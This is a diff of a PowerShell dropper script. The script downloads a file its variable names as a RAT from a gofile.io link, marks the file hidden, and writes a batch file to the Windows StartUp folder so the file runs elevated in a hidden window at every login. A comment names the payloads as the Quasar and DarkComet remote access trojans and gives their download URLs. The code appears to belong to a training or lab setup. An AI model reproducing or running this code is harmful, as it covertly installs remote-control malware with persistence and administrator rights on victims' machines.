@@ -10,7 +10,7 @@ param(
 )
 
 $raturl = "https://gofile.io/d/VHmBL1"
-$startup = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\runadm.cmd"
+$startup = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\runadm.bat"
 
 $temppwd = ConvertTo-SecureString -String $defAdminPwd -AsPlainText -Force
 $localcred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $defAdminUsr,$temppwd
@@ -26,7 +26,8 @@ Invoke-WebRequest -uri $raturl -OutFile $localpath
 $hideFile = get-item $localpath -Force
 $hideFile.attributes = "Hidden"
 
-"powershell -c start -verb runas $localpath -windowstyle hidden" | out-file -filepath $startup
+add-content $startup "@echo off"
+add-content $startup "powershell -c start -verb runas $localpath -windowstyle hidden" 
 
 # https://github.com/cybermias/publicrep/raw/master/guacconf/Python.37.svchost.exe <== OLD Quasar
 # Moved to Dark Commet https://gofile.io/d/VHmBL1
